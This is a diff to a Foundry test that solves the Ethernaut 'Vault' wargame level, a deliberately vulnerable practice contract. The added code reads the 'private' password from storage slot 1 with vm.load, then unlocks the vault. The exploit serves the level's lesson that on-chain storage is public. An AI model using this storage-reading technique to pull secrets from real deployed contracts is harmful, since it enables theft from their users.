@@ -2,12 +2,15 @@
 pragma solidity ^0.8.0;
 
 import "forge-std/Test.sol";
+import "forge-std/console2.sol";
 import "../src/Ethernaut.sol";
 import "../src/metrics/Statistics.sol";
 import "../src/levels/VaultFactory.sol";
 import "../src/levels/Vault.sol";
 
 contract VaultTest is Test {
+    using stdStorage for StdStorage;
+
     Ethernaut ethernaut;
     Statistics statistics;
     address eoa = address(0x1337);
@@ -58,6 +61,23 @@ contract VaultTest is Test {
         Vault instance = Vault(payable(instanceAddress));
 
         /* Level Hack */
+        bool locked = instance.locked();
+        console.log("locked", locked);
+        assertTrue(locked);
+
+        // 1. Use vm.load() to read directly from the storage slot
+        // We can also read the password used directly from the contract creation calldata
+        bytes32 password = vm.load(instanceAddress, bytes32(uint256(1)));
+        emit log_named_bytes32("password", password);
+        string memory stringPassword = string(abi.encode(password));
+        emit log_named_string("stringPassword", stringPassword);
+
+        // 2. Unlock
+        instance.unlock(password);
+
+        locked = instance.locked();
+        console.log("locked", locked);
+        assertFalse(locked);
 
         /* Level Submit */
         // Start recording logs to capture level completed log
